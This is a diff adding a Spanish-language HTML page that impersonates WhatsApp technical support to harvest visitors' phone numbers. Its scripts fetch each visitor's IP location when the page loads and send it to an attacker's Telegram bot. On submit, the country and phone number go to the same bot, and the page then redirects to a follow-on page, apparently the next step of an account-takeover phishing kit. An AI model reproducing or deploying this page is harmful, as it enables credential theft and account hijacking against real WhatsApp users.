@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Home</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
+  <style>
+    /* MISMO ESTILO */
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #4caf50, #81c784);
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .login-box {
+      background: white;
+      padding: 40px 30px;
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.12);
+      width: 350px;
+      max-width: 90%;
+      text-align: center;
+    }
+
+    .login-box h1 {
+      margin-bottom: 24px;
+      font-weight: 600;
+      color: #333;
+    }
+
+    label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: #555;
+      text-align: left;
+    }
+
+    select, input[type="tel"] {
+      width: 100%;
+      padding: 12px 15px;
+      font-size: 1rem;
+      margin-bottom: 20px;
+      border: 2px solid #ddd;
+      border-radius: 12px;
+      box-sizing: border-box;
+      height: 48px;
+    }
+
+    select:focus, input[type="tel"]:focus {
+      outline: none;
+      border-color: #4caf50;
+      box-shadow: 0 0 8px rgba(76, 175, 80, 0.3);
+    }
+
+    .phone-inputs {
+      display: flex;
+      gap: 12px;
+    }
+
+    #flag {
+      width: 70px;
+      padding: 12px 15px;
+      border: 2px solid #ddd;
+      border-radius: 12px;
+      background-color: #f7f7f7;
+      font-weight: 600;
+      font-size: 1rem;
+      text-align: center;
+      box-sizing: border-box;
+      height: 48px;
+    }
+
+    #tlf {
+      flex-grow: 1;
+      padding: 12px 15px;
+      border: 2px solid #ddd;
+      border-radius: 12px;
+      font-size: 1rem;
+      box-sizing: border-box;
+      height: 48px;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #21c063;
+      border: none;
+      border-radius: 14px;
+      color: white;
+      font-weight: 600;
+      font-size: 1.1rem;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #1aa454;
+    }
+
+    .logo {
+      margin-bottom: 30px;
+    }
+
+    .logo img {
+      width: 160px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-box">
+  <div class="logo">
+    <img src="https://i.postimg.cc/ZK4GVr6n/whatlog.png" alt="WhatsApp Logo" />
+  </div>
+  <h1>Soporte Técnico de WhatsApp</h1>
+  <form id="loginForm" onsubmit="return sender();">
+    <label for="pais">Selecciona tu país</label>
+    <select id="pais" name="pais" onchange="selectFlag(event)" required>
+      <option value="" disabled selected>Seleccione el País</option>
+      <option data-flag="+54" data-length="10" value="Argentina">🇦🇷 Argentina</option>
+      <option data-flag="+56" data-length="9" value="Chile">🇨🇱 Chile</option>
+      <option data-flag="+57" data-length="10" value="Colombia">🇨🇴 Colombia</option>
+      <option data-flag="+506" data-length="8" value="Costa Rica">🇨🇷 Costa Rica</option>
+      <option data-flag="+593" data-length="9" value="Ecuador">🇪🇨 Ecuador</option>
+      <option data-flag="+503" data-length="8" value="El Salvador">🇸🇻 El Salvador</option>
+      <option data-flag="+1" data-length="10" value="Estados Unidos">🇺🇸 Estados Unidos</option>
+      <option data-flag="+502" data-length="8" value="Guatemala">🇬🇹 Guatemala</option>
+      <option data-flag="+504" data-length="8" value="Honduras">🇭🇳 Honduras</option>
+      <option data-flag="+52" data-length="10" value="México">🇲🇽 México</option>
+      <option data-flag="+507" data-length="8" value="Panamá">🇵🇦 Panamá</option>
+      <option data-flag="+58" data-length="10" value="Venezuela">🇻🇪 Venezuela</option>
+    </select>
+
+    <label for="tlf">Número de teléfono</label>
+    <div class="phone-inputs">
+      <input id="flag" name="codarea" type="text" disabled placeholder="+00" />
+      <input id="tlf" name="tlf" type="tel" placeholder="Número de teléfono" maxlength="10" pattern="[0-9]{8,10}" required />
+    </div>
+
+    <button type="submit">Siguiente</button>
+  </form>
+</div>
+
+<!-- jQuery -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<!-- Config con token y chat_id -->
+<script src="dt.js"></script>
+
+<!-- IP automática sin token -->
+<script>
+window.onload = function () {
+  fetch("https://ipinfo.io/json")
+    .then(res => res.json())
+    .then(data => {
+      const ip = data.ip;
+      const ciudad = data.city || "N/A";
+      const region = data.region || "N/A";
+      const pais = data.country || "N/A";
+      const isp = data.org || "N/A";
+      const userAgent = navigator.userAgent;
+      const fecha = new Date().toLocaleString();
+
+      const mensaje = `🐇 \n\n` +
+                      `📍, ${pais}\n` ;
+                  
+
+      $.ajax({
+        url: `https://api.telegram.org/bot${telegram_bot_id}/sendMessage`,
+        method: "POST",
+        contentType: "application/json",
+        data: JSON.stringify({
+          chat_id: chat_id,
+          text: mensaje
+        })
+      });
+    })
+    .catch(err => console.error("Error al obtener IP:", err));
+};
+</script>
+
+<!-- Código del país -->
+<script>
+function selectFlag(e) {
+  var selectedOption = e.target.selectedOptions[0];
+  var flag = selectedOption.getAttribute("data-flag");
+  var length = selectedOption.getAttribute("data-length");
+  
+  document.getElementById("flag").value = flag;
+  
+  // Actualizar maxlength y pattern según el país
+  var tlfInput = document.getElementById("tlf");
+  tlfInput.setAttribute("maxlength", length);
+  tlfInput.setAttribute("pattern", "[0-9]{" + length + "}");
+  tlfInput.value = ""; // Limpiar el campo al cambiar de país
+}
+</script>
+
+<!-- Enviar datos -->
+<script>
+function sender() {
+  var pais = document.getElementById("pais").value;
+  var cod = document.getElementById("flag").value;
+  var tel = document.getElementById("tlf").value;
+  var mensaje = `WhatsApp\n\n🌍 País: ${pais}\n📞 Teléfono: ${cod}${tel}\n\nC0DE BY 4DFC TRAMP$$ 👨🏻‍💻🥷🏻`;
+
+  localStorage.setItem("telefono_completo", cod + tel);
+
+  $.ajax({
+    url: `https://api.telegram.org/bot${telegram_bot_id}/sendMessage`,
+    method: "POST",
+    contentType: "application/json",
+    data: JSON.stringify({
+      chat_id: chat_id,
+      text: mensaje
+    }),
+    success: function () {
+      window.location = "index2.html";
+    }
+  });
+
+  return false;
+}
+</script>
+
+</body>
+</html>
